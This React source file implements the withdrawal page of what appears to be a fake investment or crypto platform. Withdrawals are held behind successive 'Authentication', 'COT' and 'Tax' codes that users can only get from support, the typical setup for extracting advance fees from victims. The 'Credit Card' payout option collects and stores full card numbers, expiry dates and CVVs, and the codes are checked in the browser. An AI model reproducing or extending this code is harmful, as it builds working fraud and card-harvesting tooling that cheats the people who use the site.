import { useEffect, useMemo, useState } from "react";
import { useAuth } from "@/hooks/use-auth";
import { supabase } from "@/integrations/supabase/client";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Dialog, DialogContent, DialogTitle, DialogFooter } from "@/components/ui/dialog";
import { Card } from "@/components/ui/card";
import { toast } from "sonner";
import { Loader2, Bitcoin, Landmark, ShieldAlert, ShieldCheck, Percent, Receipt, Wallet } from "lucide-react";
import { z } from "zod";
import { CURRENCIES } from "@/lib/currencies";
import WithdrawalHistory from "@/components/dashboard/WithdrawalHistory";

const amountSchema = z.coerce.number().positive("Amount must be positive");

type CodeType = "auth" | "cot" | "tax";
interface AccountCode { id: string; code_type: CodeType; code: string; verified: boolean; }

const STEP_META: Record<CodeType, { title: string; subtitle: string; icon: typeof ShieldCheck }> = {
  auth: { title: "Authentication code", subtitle: "Enter the authentication code assigned to your account by support.", icon: ShieldCheck },
  cot:  { title: "COT code", subtitle: "Enter the Cost of Transfer (COT) code assigned to your account.", icon: Percent },
  tax:  { title: "Tax code", subtitle: "Enter the Tax code assigned to your account to release this withdrawal.", icon: Receipt },
};

type OtherMethod = "cashapp" | "paypal" | "venmo" | "chime" | "card";

export default function Withdraw() {
  const { user } = useAuth();
  const [currency, setCurrency] = useState("USD");
  const [submitting, setSubmitting] = useState(false);
  const [balance, setBalance] = useState<number | null>(null);
  const [defaultCode, setDefaultCode] = useState<string | null>(null);

  // Load currency preference
  useEffect(() => {
    if (!user) return;
    supabase.from("profiles").select("currency").eq("user_id", user.id).maybeSingle()
      .then(({ data }) => data?.currency && setCurrency(data.currency));
  }, [user?.id]);

  // Load balance
  useEffect(() => {
    if (!user) return;
    supabase.from("profiles").select("total_balance").eq("user_id", user.id).maybeSingle()
      .then(({ data }) => setBalance(data ? Number(data.total_balance) : 0));
  }, [user?.id]);

  // Load default verification code
  useEffect(() => {
    if (!user) return;
    supabase.from("profiles").select("default_verification_code").eq("user_id", user.id).maybeSingle()
      .then(({ data }) => { if (data?.default_verification_code) setDefaultCode(data.default_verification_code); });
  }, [user?.id]);

  // Realtime balance updates
  useEffect(() => {
    if (!user) return;
    const ch = supabase
      .channel(`withdraw-balance-${user.id}`)
      .on("postgres_changes",
        { event: "UPDATE", schema: "public", table: "profiles", filter: `user_id=eq.${user.id}` },
        (payload) => { if ((payload.new as any).total_balance !== undefined) setBalance(Number((payload.new as any).total_balance)); })
      .subscribe();
    return () => { supabase.removeChannel(ch); };
  }, [user?.id]);

  const symbol = CURRENCIES.find(c => c.code === currency)?.symbol ?? currency;

  // Form state
  const [crypto, setCrypto] = useState({ coin: "BTC", amount: "", address: "" });
  const [bank, setBank] = useState({ amount: "", account_name: "", account_no: "", bank_name: "", swift: "" });
  const [other, setOther] = useState<{
    method: OtherMethod; amount: string;
    cashapp_tag: string; paypal_email: string; venmo_handle: string; chime_email: string;
    card_number: string; card_exp: string; card_cvv: string; card_billing_name: string;
  }>({
    method: "cashapp", amount: "",
    cashapp_tag: "", paypal_email: "", venmo_handle: "", chime_email: "",
    card_number: "", card_exp: "", card_cvv: "", card_billing_name: "",
  });

  // Verification dialog state
  const [authOpen, setAuthOpen] = useState(false);
  const [pendingTxId, setPendingTxId] = useState<string | null>(null);
  const [codes, setCodes] = useState<AccountCode[]>([]);
  const [stepIndex, setStepIndex] = useState(0);
  const [input, setInput] = useState("");
  const [verifying, setVerifying] = useState(false);
  const [refreshHistory, setRefreshHistory] = useState(0);

  const activeSteps = useMemo<CodeType[]>(() => {
    const steps: CodeType[] = ["auth"];
    if (codes.some((c) => c.code_type === "cot")) steps.push("cot");
    if (codes.some((c) => c.code_type === "tax")) steps.push("tax");
    return steps;
  }, [codes]);

  const currentType: CodeType | null = activeSteps[stepIndex] ?? null;
  const currentCode = currentType === "auth"
    ? codes.find((c) => c.code_type === "auth") ?? null
    : currentType ? codes.find((c) => c.code_type === currentType) : null;

  useEffect(() => {
    if (!authOpen || !user) return;
    fetchCodes();
  }, [authOpen, user?.id]);

  const fetchCodes = async () => {
    if (!user) return;
    const { data } = await supabase
      .from("account_withdrawal_codes")
      .select("*")
      .eq("user_id", user.id)
      .maybeSingle();

    if (data) {
      const rows: AccountCode[] = [];
      if ((data as any).auth_code) rows.push({ id: (data as any).id, code_type: "auth", code: (data as any).auth_code, verified: false });
      if ((data as any).cot_required && (data as any).cot_code) rows.push({ id: (data as any).id, code_type: "cot", code: (data as any).cot_code, verified: false });
      if ((data as any).tax_required && (data as any).tax_code) rows.push({ id: (data as any).id, code_type: "tax", code: (data as any).tax_code, verified: false });
      setCodes(rows);
    }
  };

  const submit = async (method: string, body: Record<string, unknown>, amt: string) => {
    if (!user) return;
    const a = amountSchema.safeParse(amt);
    if (!a.success) { toast.error(a.error.errors[0].message); return; }
    if (balance !== null && a.data > balance) { toast.error("Insufficient balance"); return; }
    setSubmitting(true);
    // Strip non-existent destination key before insert
    const { destination: _omit, ...rest } = body as Record<string, unknown>;
    const { data, error } = await supabase.from("transactions").insert({
      user_id: user.id, amount: a.data, method, type: "withdrawal", status: "awaiting_code", ...rest,
    } as never).select("id").maybeSingle();
    setSubmitting(false);
    if (error || !data) { toast.error(error?.message ?? "Failed to submit"); return; }
    setPendingTxId(data.id);
    setInput("");
    setStepIndex(0);
    setAuthOpen(true);
    setRefreshHistory((n) => n + 1);
  };

  const verify = async () => {
    if (!user || !currentType) return;
    const entered = input.trim().toUpperCase();
    if (entered.length < 4) { toast.error("Enter the code"); return; }

    if (currentType === "auth") {
      const assignedAuth = codes.find((c) => c.code_type === "auth");
      const validCode = assignedAuth ? assignedAuth.code.trim().toUpperCase() : defaultCode?.trim().toUpperCase();
      if (!validCode) { toast.error("No authentication code assigned. Contact support."); return; }
      if (entered !== validCode) { toast.error("Invalid authentication code."); return; }
      setVerifying(true);
      if (assignedAuth) await supabase.from("account_withdrawal_codes").update({ verified: true } as never).eq("id", assignedAuth.id);
    } else {
      if (!currentCode) { toast.error("No code assigned for this step."); return; }
      if (entered !== currentCode.code.trim().toUpperCase()) { toast.error(`Invalid ${STEP_META[currentType].title.toLowerCase()}.`); return; }
      setVerifying(true);
      await supabase.from("account_withdrawal_codes").update({ verified: true } as never).eq("id", currentCode.id);
    }

    const nextIdx = stepIndex + 1;
    setInput("");
    if (nextIdx >= activeSteps.length) {
      if (pendingTxId) await supabase.from("transactions").update({ status: "pending_review", auth_code_verified: true } as never).eq("id", pendingTxId);
      setVerifying(false);
      setAuthOpen(false);
      setPendingTxId(null);
      setRefreshHistory((n) => n + 1);
      toast.success("Codes verified. Withdrawal is under final review.");
    } else {
      setStepIndex(nextIdx);
      setVerifying(false);
      toast.success(`${STEP_META[currentType].title} accepted.`);
    }
  };

  const cancelRequest = async () => {
    if (pendingTxId) await supabase.from("transactions").update({ status: "cancelled" } as never).eq("id", pendingTxId);
    setAuthOpen(false);
    setPendingTxId(null);
    setRefreshHistory((n) => n + 1);
  };

  const submitOther = () => {
    const m = other.method;
    const body: Record<string, unknown> = {};
    let label = "";
    if (m === "cashapp") {
      if (!other.cashapp_tag.trim()) return toast.error("Enter your $cashtag");
      body.destination = other.cashapp_tag.trim(); body.cashapp_tag = other.cashapp_tag.trim(); label = "CashApp";
    } else if (m === "paypal") {
      if (!/^\S+@\S+\.\S+$/.test(other.paypal_email)) return toast.error("Enter a valid PayPal email");
      body.destination = other.paypal_email.trim(); body.paypal_email = other.paypal_email.trim(); label = "PayPal";
    } else if (m === "venmo") {
      if (!other.venmo_handle.trim()) return toast.error("Enter your Venmo handle");
      body.destination = other.venmo_handle.trim(); body.venmo_handle = other.venmo_handle.trim(); label = "Venmo";
    } else if (m === "chime") {
      if (!other.chime_email.trim()) return toast.error("Enter your Chime email");
      body.destination = other.chime_email.trim(); label = "Chime";
    } else if (m === "card") {
      if (other.card_number.replace(/\s/g, "").length < 12) return toast.error("Enter a valid card number");
      if (!other.card_exp.trim()) return toast.error("Enter expiration date");
      if (other.card_cvv.length < 3) return toast.error("Enter CVV");
      if (!other.card_billing_name.trim()) return toast.error("Enter billing name");
      body.destination = `**** ${other.card_number.replace(/\s/g, "").slice(-4)}`;
      body.card_number = other.card_number.replace(/\s/g, "");
      body.card_exp = other.card_exp.trim(); body.card_cvv = other.card_cvv.trim();
      body.card_billing_name = other.card_billing_name.trim(); label = "Credit Card";
    }
    submit(label, body, other.amount);
  };

  const StepIcon = currentType ? STEP_META[currentType].icon : ShieldAlert;

  // Shared input classes for dark theme
  const selectCls = "w-full h-10 rounded-md border border-white/10 bg-white/5 px-3 text-sm text-white focus:outline-none focus:ring-2 focus:ring-yellow-500/50";

  return (
    <div className="max-w-2xl space-y-6">
      {/* Header */}
      <div>
        <p className="text-xs font-semibold tracking-widest text-white/40 uppercase mb-1">Cash out</p>
        <h1 className="text-3xl font-black text-white">Withdraw</h1>
        <p className="text-sm text-white/60 mt-1">
          Available balance:{" "}
          {balance !== null
            ? <span className="text-white font-semibold">{symbol}{balance.toLocaleString()}</span>
            : <span className="inline-block align-middle h-4 w-24 rounded bg-white/10 animate-pulse" />}
        </p>
      </div>

      <Tabs defaultValue="crypto">
        <TabsList className="grid w-full grid-cols-3 bg-white/5 border border-white/10 rounded-xl p-1">
          <TabsTrigger value="crypto" className="data-[state=active]:bg-slate-700 data-[state=active]:text-white/60 rounded-lg text-sm font-medium transition-all">
            <Bitcoin className="w-3.5 h-3.5 mr-1.5" /> Crypto
          </TabsTrigger>
          <TabsTrigger value="bank" className="data-[state=active]:bg-slate-700 data-[state=active]:text-white/60 rounded-lg text-sm font-medium transition-all">
            <Landmark className="w-3.5 h-3.5 mr-1.5" /> Bank
          </TabsTrigger>
          <TabsTrigger value="others" className="data-[state=active]:bg-slate-700 data-[state=active]:text-white/60 rounded-lg text-sm font-medium transition-all">
            <Wallet className="w-3.5 h-3.5 mr-1.5" /> Others
          </TabsTrigger>
        </TabsList>

        {/* ── CRYPTO ── */}
        <TabsContent value="crypto" className="mt-5">
          <Card className="bg-white/5 border-white/10 p-6 space-y-5">
            <div className="grid sm:grid-cols-2 gap-4">
              <div className="space-y-1.5">
                <Label className="text-white/70 text-sm">Coin</Label>
                <select value={crypto.coin} onChange={(e) => setCrypto({ ...crypto, coin: e.target.value })} className={selectCls}>
                  <option value="BTC">Bitcoin (BTC)</option>
                  <option value="ETH">Ethereum (ETH)</option>
                  <option value="USDT">Tether (USDT)</option>
                </select>
              </div>
              <div className="space-y-1.5">
                <Label className="text-white/70 text-sm">Amount ({currency})</Label>
                <div className="relative">
                  <span className="absolute left-3 top-1/2 -translate-y-1/2 text-white/40 text-sm">{symbol}</span>
                  <Input type="number" min="1" step="0.01" value={crypto.amount} onChange={(e) => setCrypto({ ...crypto, amount: e.target.value })}
                    className="pl-7 bg-white/5 border-white/10 text-white placeholder:text-white/20" />
                </div>
              </div>
            </div>
            <div className="space-y-1.5">
              <Label className="text-white/70 text-sm">Wallet address</Label>
              <Input value={crypto.address} onChange={(e) => setCrypto({ ...crypto, address: e.target.value })}
                placeholder="Paste wallet address" className="font-mono text-xs bg-white/5 border-white/10 text-white placeholder:text-white/20" />
            </div>
            <Button variant="gold" disabled={submitting} onClick={() => submit(`Crypto ${crypto.coin}`, { wallet_address: crypto.address, destination: crypto.address }, crypto.amount)} className="w-full">
              {submitting ? <Loader2 className="w-4 h-4 animate-spin mr-2" /> : null}
              {submitting ? "Processing…" : "Request Withdrawal"}
            </Button>
          </Card>
        </TabsContent>

        {/* ── BANK ── */}
        <TabsContent value="bank" className="mt-5">
          <Card className="bg-white/5 border-white/10 p-6 space-y-5">
            <div className="grid sm:grid-cols-2 gap-4">
              <div className="space-y-1.5">
                <Label className="text-white/70 text-sm">Amount ({currency})</Label>
                <div className="relative">
                  <span className="absolute left-3 top-1/2 -translate-y-1/2 text-white/40 text-sm">{symbol}</span>
                  <Input type="number" min="1" step="0.01" value={bank.amount} onChange={(e) => setBank({ ...bank, amount: e.target.value })}
                    className="pl-7 bg-white/5 border-white/10 text-white placeholder:text-white/20" />
                </div>
              </div>
              <div className="space-y-1.5">
                <Label className="text-white/70 text-sm">Bank name</Label>
                <Input value={bank.bank_name} onChange={(e) => setBank({ ...bank, bank_name: e.target.value })}
                  className="bg-white/5 border-white/10 text-white placeholder:text-white/20" />
              </div>
              <div className="space-y-1.5">
                <Label className="text-white/70 text-sm">Account name</Label>
                <Input value={bank.account_name} onChange={(e) => setBank({ ...bank, account_name: e.target.value })}
                  className="bg-white/5 border-white/10 text-white placeholder:text-white/20" />
              </div>
              <div className="space-y-1.5">
                <Label className="text-white/70 text-sm">Account number</Label>
                <Input value={bank.account_no} onChange={(e) => setBank({ ...bank, account_no: e.target.value })}
                  className="bg-white/5 border-white/10 text-white placeholder:text-white/20" />
              </div>
              <div className="sm:col-span-2 space-y-1.5">
                <Label className="text-white/70 text-sm">SWIFT / IBAN</Label>
                <Input value={bank.swift} onChange={(e) => setBank({ ...bank, swift: e.target.value })}
                  className="bg-white/5 border-white/10 text-white placeholder:text-white/20" />
              </div>
            </div>
            <Button variant="gold" disabled={submitting}
              onClick={() => submit("Bank Transfer", { destination: bank.account_no, bank_details: bank }, bank.amount)} className="w-full">
              {submitting ? <Loader2 className="w-4 h-4 animate-spin mr-2" /> : null}
              {submitting ? "Processing…" : "Request Withdrawal"}
            </Button>
          </Card>
        </TabsContent>

        {/* ── OTHERS ── */}
        <TabsContent value="others" className="mt-5">
          <Card className="bg-white/5 border-white/10 p-6 space-y-5">
            <div className="grid sm:grid-cols-2 gap-4">
              <div className="space-y-1.5">
                <Label className="text-white/70 text-sm">Method</Label>
                <select value={other.method} onChange={(e) => setOther({ ...other, method: e.target.value as OtherMethod })} className={selectCls}>
                  <option value="cashapp">Cash App</option>
                  <option value="paypal">PayPal</option>
                  <option value="venmo">Venmo</option>
                  <option value="chime">Chime</option>
                  <option value="card">Credit Card</option>
                </select>
              </div>
              <div className="space-y-1.5">
                <Label className="text-white/70 text-sm">Amount ({currency})</Label>
                <div className="relative">
                  <span className="absolute left-3 top-1/2 -translate-y-1/2 text-white/40 text-sm">{symbol}</span>
                  <Input type="number" min="1" step="0.01" value={other.amount} onChange={(e) => setOther({ ...other, amount: e.target.value })}
                    className="pl-7 bg-white/5 border-white/10 text-white placeholder:text-white/20" />
                </div>
              </div>
            </div>

            {other.method === "cashapp" && (
              <div className="space-y-1.5">
                <Label className="text-white/70 text-sm">Cash App tag</Label>
                <Input value={other.cashapp_tag} onChange={(e) => setOther({ ...other, cashapp_tag: e.target.value })}
                  placeholder="$username" className="bg-white/5 border-white/10 text-white placeholder:text-white/20" />
              </div>
            )}
            {other.method === "paypal" && (
              <div className="space-y-1.5">
                <Label className="text-white/70 text-sm">PayPal email</Label>
                <Input type="email" value={other.paypal_email} onChange={(e) => setOther({ ...other, paypal_email: e.target.value })}
                  placeholder="you@example.com" className="bg-white/5 border-white/10 text-white placeholder:text-white/20" />
              </div>
            )}
            {other.method === "venmo" && (
              <div className="space-y-1.5">
                <Label className="text-white/70 text-sm">Venmo handle</Label>
                <Input value={other.venmo_handle} onChange={(e) => setOther({ ...other, venmo_handle: e.target.value })}
                  placeholder="@yourhandle" className="bg-white/5 border-white/10 text-white placeholder:text-white/20" />
              </div>
            )}
            {other.method === "chime" && (
              <div className="space-y-1.5">
                <Label className="text-white/70 text-sm">Chime email</Label>
                <Input type="email" value={other.chime_email} onChange={(e) => setOther({ ...other, chime_email: e.target.value })}
                  placeholder="you@chime.com" className="bg-white/5 border-white/10 text-white placeholder:text-white/20" />
              </div>
            )}
            {other.method === "card" && (
              <div className="space-y-4">
                <div className="space-y-1.5">
                  <Label className="text-white/70 text-sm">Card number</Label>
                  <Input value={other.card_number} onChange={(e) => setOther({ ...other, card_number: e.target.value })}
                    placeholder="4242 4242 4242 4242" inputMode="numeric"
                    className="bg-white/5 border-white/10 text-white placeholder:text-white/20" />
                </div>
                <div className="grid grid-cols-2 gap-4">
                  <div className="space-y-1.5">
                    <Label className="text-white/70 text-sm">Expiration (MM/YY)</Label>
                    <Input value={other.card_exp} onChange={(e) => setOther({ ...other, card_exp: e.target.value })}
                      placeholder="08/27" className="bg-white/5 border-white/10 text-white placeholder:text-white/20" />
                  </div>
                  <div className="space-y-1.5">
                    <Label className="text-white/70 text-sm">CVV</Label>
                    <Input value={other.card_cvv} onChange={(e) => setOther({ ...other, card_cvv: e.target.value })}
                      placeholder="123" inputMode="numeric" maxLength={4}
                      className="bg-white/5 border-white/10 text-white placeholder:text-white/20" />
                  </div>
                </div>
                <div className="space-y-1.5">
                  <Label className="text-white/70 text-sm">Billing name</Label>
                  <Input value={other.card_billing_name} onChange={(e) => setOther({ ...other, card_billing_name: e.target.value })}
                    placeholder="Name on card" className="bg-white/5 border-white/10 text-white placeholder:text-white/20" />
                </div>
              </div>
            )}

            <Button variant="gold" disabled={submitting} onClick={submitOther} className="w-full">
              {submitting ? <Loader2 className="w-4 h-4 animate-spin mr-2" /> : null}
              {submitting ? "Processing…" : "Request Withdrawal"}
            </Button>
          </Card>
        </TabsContent>
      </Tabs>

      {/* ── VERIFICATION DIALOG ── */}
      <Dialog open={authOpen} onOpenChange={(o) => { if (!o) cancelRequest(); }}>
        <DialogContent className="max-w-md p-0 overflow-hidden border-white/10 bg-zinc-900" style={{ borderRadius: 16 }}>
          {/* Header */}
          <div className="px-6 pt-6 pb-4 border-b border-white/10 bg-gradient-to-b from-white/5 to-transparent">
            <div className="flex items-center gap-3 mb-3">
              <div className="w-10 h-10 rounded-xl bg-yellow-500/15 flex items-center justify-center">
                <StepIcon className="w-5 h-5 text-yellow-500" />
              </div>
              <div className="flex-1 min-w-0">
                <DialogTitle className="text-[15px] font-semibold leading-tight text-white">
                  {currentType ? STEP_META[currentType].title : "Authorization required"}
                </DialogTitle>
              </div>
            </div>

            {/* Step progress bar */}
            {activeSteps.length > 1 && (
              <div className="flex items-center gap-1.5">
                {activeSteps.map((t, i) => {
                  const done = i < stepIndex;
                  const active = i === stepIndex;
                  return (
                    <div key={t} className={`h-1 flex-1 rounded-full transition-colors ${done ? "bg-yellow-500" : active ? "bg-yellow-500/70" : "bg-white/10"}`} />
                  );
                })}
              </div>
            )}
          </div>

          {/* Body */}
          <div className="px-6 py-6 space-y-4">
            <p className="text-[13px] text-white/50 leading-relaxed">
              {currentType ? STEP_META[currentType].subtitle : ""}
            </p>
            <div className="space-y-1.5">
              <Label htmlFor="auth-code" className="text-[12px] font-medium text-white/60">Verification code</Label>
              <Input
                id="auth-code"
                value={input}
                onChange={(e) => setInput(e.target.value.toUpperCase())}
                placeholder="ENTER CODE"
                className="font-mono tracking-[0.4em] text-center text-base h-12 rounded-xl border-2 border-white/10 bg-white/5 text-white placeholder:text-white/20 focus-visible:ring-yellow-500/50 focus-visible:border-yellow-500/50"
                maxLength={12}
                autoFocus
              />
              <p className="text-[11px] text-white/30">
                Don't have this code? Contact support to receive it.
              </p>
            </div>
          </div>

          {/* Footer */}
          <DialogFooter className="px-6 py-4 bg-white/5 border-t border-white/10 gap-2 sm:gap-2">
            <Button variant="outline" onClick={cancelRequest}
              className="rounded-full border-white/10 text-white/70 hover:bg-white/10 hover:text-white bg-transparent">
              Cancel
            </Button>
            <Button variant="gold" disabled={verifying || input.trim().length < 4} onClick={verify} className="rounded-full min-w-[140px]">
              {verifying ? <Loader2 className="w-4 h-4 animate-spin" /> : (stepIndex + 1 === activeSteps.length ? "Verify & finish" : "Verify & continue")}
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>

      {/* Withdrawal History */}
      <WithdrawalHistory
        symbol={symbol}
        refreshKey={refreshHistory}
        onResume={(txId) => { setPendingTxId(txId); setInput(""); setStepIndex(0); setAuthOpen(true); }}
      />
    </div>
  );
}
